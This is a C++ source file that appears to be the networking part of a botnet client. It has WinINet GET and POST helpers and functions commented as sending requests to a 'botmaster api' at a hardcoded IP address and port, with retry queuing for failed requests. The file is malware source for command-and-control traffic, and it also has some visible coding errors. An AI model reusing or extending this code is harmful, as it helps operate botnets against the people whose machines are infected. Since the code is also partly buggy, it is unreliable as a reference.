#include "curl.h"
#include <wininet.h>
#include <tchar.h>
#include <string>
#include "HttpLib.h"
#include "UtilLib.h"
#include <iostream>

using namespace std;

string url = "70.61.16.8";
int port = 50000;

string httpGetRequest(string url, string api, int port, char* args){
	// string variable to store the response from the server
	string response = "";
	// append the query string '?args=value..." to the end of the url
	wstring wapi = s2ws(api) + s2ws(args);

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{

		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", wapi.c_str(), NULL, NULL, parrAcceptTypes, INTERNET_FLAG_NO_CACHE_WRITE, 0);

			if (hRequest == NULL){}
			else
			{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), NULL, 0);

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	return response;
}

string httpPostRequest(string url, string api, int port, char *args){
	string response = "";

	HINTERNET hInternet = InternetOpenW(L"MyUserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet == NULL){}
	else{
		HINTERNET hConnect = InternetConnectW(hInternet, s2ws(url).c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);

		if (hConnect == NULL){}
		else
		{
			const wchar_t* parrAcceptTypes[] = { L"text/*", NULL };
			HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", s2ws(api).c_str(), NULL, NULL, parrAcceptTypes, 0, 0);

			if (hRequest == NULL){}
			else{
				LPCWSTR hdrs = L"Content-Type: application/x-www-form-urlencoded";

				BOOL bRequestSent = HttpSendRequestW(hRequest, hdrs, wcslen(hdrs), args, strlen(args));

				if (!bRequestSent){}
				else{
					const int nBuffSize = 1024;
					char buff[nBuffSize];

					BOOL bKeepReading = true;
					DWORD dwBytesRead = -1;

					while (bKeepReading && dwBytesRead != 0){
						bKeepReading = InternetReadFile(hRequest, buff, nBuffSize, &dwBytesRead);
						response.append(buff, dwBytesRead);
					}
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
	return response;
}

//sends a post request to the botmaster api
void sendP_Request(string url, int port, string api, vector<vector<string>> &requestQueue, string postArgs){
	printf("query is: %s\n", postArgs.c_str());
	if (postArgs != "err"){
		char* queryArray = NULL;
		stringToCharArray(postArgs, &queryArray);
		string postRes = httpPostRequest(url, api, port, queryArray);
		if (postRes == ""){
			string requestParams = "";
			if(&requestQueue != NULL){
				requestParams.append(postArgs);
				queueRequest(requestQueue, api, requestParams);
			}
		}
	}
}

//sends a get request to the botmaster api
string sendG_Request(string url, int port, string api, vector<vector<string>> &requestQueue, string getQuery){
	string response = "-1";
	//string query = getArgsToString(keys, values, getSize(keys), params, getSize(params), "GET");
	// if the query string was formed correctly
	char* queryArray = NULL;
	stringToCharArray(getQuery, &queryArray);
	response = httpGetRequest(url, api, port, queryArray);
	delete queryArray;	// free the memory for this array
	printf("The response is: %s\n", response.c_str());
	// if no data was returned
	if (response != "400"){
		string requestParams = "";
		requestParams.append(getQuery);
		queueRequest(requestQueue, api, requestParams);
	}
	return response;
}

//void sendP_Request(vector<vector<string>> &requestQueue, vector<string> keys, vector<string> values, vector<string> params, string api, string data){
//	char* query = NULL;
//	if (data.compare("")){
//		params.push_back("data");
//		keys.push_back("data");
//		values.push_back(data);
//	}
//	getArgsToString(keys, values, getSize(keys), params, getSize(params), "POST", &query);
//	if (strcmp(query, "err") != 0){
//		char* postRes = httpPostRequest("70.61.16.8", api, 50000, query);
//		if (strcmp(postRes, "") == 0){
//			string requestParams = "";
//			requestParams.append(query);
//			queueRequest(requestQueue, api, requestParams);
//		}
//		delete[] postRes;
//	}
//}
